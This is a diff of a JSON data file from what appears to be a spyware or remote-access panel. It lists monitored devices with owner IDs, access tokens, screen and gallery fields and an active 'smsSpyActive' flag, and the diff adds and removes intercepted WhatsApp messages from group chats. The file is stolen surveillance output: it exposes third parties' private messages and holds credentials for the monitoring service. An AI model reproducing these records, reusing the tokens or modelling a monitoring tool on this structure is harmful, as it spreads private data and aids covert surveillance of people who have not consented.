@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775045128172,
+    "lastSeen": 1775045134164,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13343 pesan): ~ yesa dipanggil nengok.",
+        "content": ".brathd DECUL",
+        "time": "01/04 20:05",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775045134777
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (13342 pesan): ~ cewek bauti 👅☝🏻",
@@ -4011,14 +4019,6 @@
         "time": "01/04 19:56",
         "pkg": "com.whatsapp",
         "receivedAt": 1775044565692
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB ISIAN ZAYN X OWN [2] (1766 pesan): ~ dikzz [own Zayn gb8 x PT bomo]",
-        "content": "22 3 nvmtps fpt n mcro mobi andro only",
-        "time": "01/04 19:56",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775044565565
       }
     ],
     "galleryPhotos": [],
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775045126686,
+    "lastSeen": 1775045132796,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
